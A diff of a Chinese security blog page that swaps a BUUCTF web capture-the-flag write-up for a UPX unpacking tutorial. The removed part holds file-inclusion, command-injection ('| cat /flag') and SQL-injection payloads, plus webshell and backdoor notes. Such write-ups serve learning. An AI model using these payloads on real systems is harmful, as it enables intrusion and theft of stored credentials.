@@ -20,22 +20,24 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Week 2 &lt;2020.07.27 - 2020.08.02&gt;">
+  <meta name="description" content="UPX简介1234567891011UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：1、让正规文件被保护起来，不容易被修改和破解。2、使文件压缩变小。3、保护杀毒软件安装程序，使之不受病毒侵害。4">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week20200727-20200802">
-<meta property="og:url" content="http://yoursite.com/2020/07/28/week20200727-20200802/index.html">
+<meta property="og:title" content="UPX壳详解">
+<meta property="og:url" content="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/index.html">
 <meta property="og:site_name" content="jkjk">
-<meta property="og:description" content="Week 2 &lt;2020.07.27 - 2020.08.02&gt;">
+<meta property="og:description" content="UPX简介1234567891011UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：1、让正规文件被保护起来，不容易被修改和破解。2、使文件压缩变小。3、保护杀毒软件安装程序，使之不受病毒侵害。4">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2020/07/28/week20200727-20200802/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200729003126637.png">
-<meta property="article:published_time" content="2020-07-27T17:28:32.000Z">
-<meta property="article:modified_time" content="2020-07-31T16:29:22.441Z">
+<meta property="og:image" content="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200803160918611.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161135150.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161244521.png">
+<meta property="article:published_time" content="2020-08-02T13:29:41.000Z">
+<meta property="article:modified_time" content="2020-08-03T10:36:23.462Z">
 <meta property="article:author" content="Du11JK">
-<meta property="article:tag" content="CTF - Web">
+<meta property="article:tag" content="Reverse">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/07/28/week20200727-20200802/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200729003126637.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200803160918611.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/07/28/week20200727-20200802/">
+<link rel="canonical" href="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/">
 
 
 <script id="page-configurations">
@@ -48,7 +50,7 @@
   };
 </script>
 
-  <title>week20200727-20200802 | jkjk</title>
+  <title>UPX壳详解 | jkjk</title>
   
 
 
@@ -197,7 +199,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/28/week20200727-20200802/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/a.jpg">
@@ -210,7 +212,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week20200727-20200802
+          UPX壳详解
         </h1>
 
         <div class="post-meta">
@@ -220,14 +222,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-07-28 01:28:32" itemprop="dateCreated datePublished" datetime="2020-07-28T01:28:32+08:00">2020-07-28</time>
+              <time title="创建时间：2020-08-02 21:29:41" itemprop="dateCreated datePublished" datetime="2020-08-02T21:29:41+08:00">2020-08-02</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-01 00:29:22" itemprop="dateModified" datetime="2020-08-01T00:29:22+08:00">2020-08-01</time>
+                <time title="修改时间：2020-08-03 18:36:23" itemprop="dateModified" datetime="2020-08-03T18:36:23+08:00">2020-08-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -235,7 +237,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+                  <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
                 </span>
             </span>
 
@@ -250,46 +252,44 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Week-2-lt-2020-07-27-2020-08-02-gt"><a href="#Week-2-lt-2020-07-27-2020-08-02-gt" class="headerlink" title="Week 2 &lt;2020.07.27 - 2020.08.02&gt;"></a>Week 2 &lt;2020.07.27 - 2020.08.02&gt;</h1><a id="more"></a>
+        <h1 id="UPX简介"><a href="#UPX简介" class="headerlink" title="UPX简介"></a>UPX简介</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：</span><br><span class="line"></span><br><span class="line">1、让正规文件被保护起来，不容易被修改和破解。</span><br><span class="line"></span><br><span class="line">2、使文件压缩变小。</span><br><span class="line"></span><br><span class="line">3、保护杀毒软件安装程序，使之不受病毒侵害。</span><br><span class="line"></span><br><span class="line">4、木马，病毒的保护外壳，使之难以为攻破。</span><br><span class="line"></span><br><span class="line">利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才 能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开 后，以后的就交给真正的程序。</span><br></pre></td></tr></table></figure>
 
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目和网页都给出了提示，考察文件包含</p>
-<p>同 Secret File 的解法，使用”php://filter”伪协议进行包含</p>
-<p>payload：/?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>获得base64码，解密得到flag</p>
-<p>flag{f876c961-c87b-4060-a5b5-299aae870ace}</p>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>用AntSword连接，密码网页给出了是”Syc”</p>
-<p><img src="/2020/07/28/week20200727-20200802/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200729003126637.png" alt="image-20200729003126637"></p>
-<p>连接，在根目录找到flag文件</p>
-<p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>—— 转自<a href="https://www.cnblogs.com/20175211lyz/p/11455355.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11455355.html</a> ——</p>
+<h1 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h1><p>upx壳的官网是：<a href="https://upx.github.io/" target="_blank" rel="noopener">https://upx.github.io/</a><br>下载最新版的upx：<a href="https://github.com/upx/upx/releases/" target="_blank" rel="noopener">https://github.com/upx/upx/releases/</a> </p>
+<h1 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h1><p><strong>（“堆栈平衡”原理）</strong></p>
 <blockquote>
-<p><strong>.user.ini 文件</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER[‘DOCUMENT_ROOT’]]所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。<br>两个新的 INI 指令，<em>user_ini.filename</em> 和 <em>user_ini.cache_ttl</em> 控制着用户 INI 文件的使用。<br><em>user_ini.filename</em> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <em>.user.ini*。<br>*user_ini.cache_ttl</em> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+<p>call指令：<br>  1.向堆栈中压入下一行程序的地址；<br>  2.JMP到call的子程序地址处。</p>
 </blockquote>
 <blockquote>
-<p><strong>绕过exif_imagetype()方法</strong><br>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
+<p>RETN指令：<br>  1.将当前的ESP中指向的地址出栈；<br>  2.JMP到这个地址。这个就完成了一次调用子程序的过程</p>
 </blockquote>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。</p>
+</blockquote>
+<blockquote>
+<p>在程序自解密或者自解压过程中, 多数壳会先将当前寄存器状态压栈, 如使用pushad, 而在解压结束后, 会将之前的寄存器值出栈, 如使用popad. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发（这就是我们要下硬件断点的原因），然后在程序当前位置, 只需要一些单步操作, 就会到达正确的OEP位置</p>
+</blockquote>
+<p><strong>载入程序后只有esp寄存器内容发生变化，那么这个程序多半可以用ESP定律(存疑)</strong></p>
+<h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><h2 id="脱壳三步法"><a href="#脱壳三步法" class="headerlink" title="脱壳三步法"></a>脱壳三步法</h2><blockquote>
+<p>① 寻找原始OEP<br>这一步骤的主要作用就是要确定原始程序代码到底在哪里，能找到原始程序的代码，说明壳代码执行完了，我们只有找到原始OEP才能进行下一步的动作。</p>
+<p>② dump内存到文件<br>当我们找到原始OEP，调试运行到原始OEP时，只要代码被还原，我们就可以在这个地方进行dump内存，将内存中被还原的代码和数据抓取下来，重新保存成一个文件，这样脱完壳时，我们就可以用静态分析工具分析程序了。</p>
+<p>③ 修复文件<br>这一步主要就是修复IAT，对从内存中转储到本地的文件进行修复。</p>
+</blockquote>
+<h2 id="示例：BUUCTF-Reverse-新年快乐"><a href="#示例：BUUCTF-Reverse-新年快乐" class="headerlink" title="示例：BUUCTF_Reverse_新年快乐"></a>示例：BUUCTF_Reverse_新年快乐</h2><p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200803160918611.png" alt="image-20200803160918611"></p>
+<p>使用ExeinfoPE查壳，确认是UPX</p>
+<p>x32dbg打开，寻找原始OEP</p>
+<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161135150.png" alt="image-20200803161135150"></p>
+<p>不需要下ESP硬件断点，F9运行，可以看到popad在上方</p>
+<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161244521.png" alt="image-20200803161244521"></p>
+<p>有一系列jmp指令，选择跳转较远的，地址00401280，一般就是原始OEP，可以下一个断电F9运行，确认是原始OEP</p>
+<p>使用Scylla插件，Dump，自动寻找IAT，获取导入表，修复Dump文件</p>
+<p>IDA打开脱壳文件，确认成功</p>
+<p>注：原始OEP也可以通过逐条分析汇编指令寻找，难度较大；有经验的话可以直接搜索popad</p>
+<p>参考：</p>
+<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918</a></p>
+<p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a></p>
+<p><a href="https://blog.csdn.net/qq_42967398/article/details/96444954" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/96444954</a></p>
+<p><a href="https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc</a></p>
 
-<p>知识点：<br>1.利用.user.ini上传/隐藏后门<br>2.绕过exif_imagetype()</p>
-<p>———————————————————————————————</p>
-<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>没有过滤，管道符直接取flag</p>
-<p>payload: 127.0.0.1 | cat /flag</p>
-<p>flag{de9ab224-511d-4a33-9e1d-5c871c9518b1}</p>
-<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>知识点：双写绕过</p>
-<p>数据库 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure>
-
-<p>数据表 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure>
-<p>目标在 ‘b4bsql’</p>
-<p>列 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br></pre></td></tr></table></figure>
-<p>列名’id,username,password’</p>
-<p>字段 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure>
-
-<p>flag{04a7a268-baf9-48a5-b7cb-2b8aeebae765}</p>
-<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2>
     </div>
 
     
@@ -317,7 +317,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/CTF-Web/" rel="tag"># CTF - Web</a>
+              <a href="/tags/Reverse/" rel="tag"># Reverse</a>
           </div>
 
         
@@ -326,13 +326,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/07/26/week20200720-20200726/" rel="prev" title="week20200720-20200726">
-      <i class="fa fa-chevron-left"></i> week20200720-20200726
+    <a href="/2020/08/02/OEP%E5%85%A5%E5%8F%A3%E6%9F%A5%E6%89%BE%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%A3%B3%E7%9A%84%E8%AF%86%E5%88%AB/" rel="prev" title="OEP入口查找和基本壳的识别">
+      <i class="fa fa-chevron-left"></i> OEP入口查找和基本壳的识别
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/29/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
-      SQL注入 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -391,7 +388,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week-2-lt-2020-07-27-2020-08-02-gt"><span class="nav-number">1.</span> <span class="nav-text">Week 2 &lt;2020.07.27 - 2020.08.02&gt;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-number">1.1.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-number">1.2.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-number">1.3.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">1.4.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-number">1.5.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">1.6.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">1.7.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">1.8.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UPX简介"><span class="nav-number">1.</span> <span class="nav-text">UPX简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脱壳工具"><span class="nav-number">2.</span> <span class="nav-text">脱壳工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ESP定律"><span class="nav-number">3.</span> <span class="nav-text">ESP定律</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#手动脱壳"><span class="nav-number">4.</span> <span class="nav-text">手动脱壳</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#脱壳三步法"><span class="nav-number">4.1.</span> <span class="nav-text">脱壳三步法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#示例：BUUCTF-Reverse-新年快乐"><span class="nav-number">4.2.</span> <span class="nav-text">示例：BUUCTF_Reverse_新年快乐</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
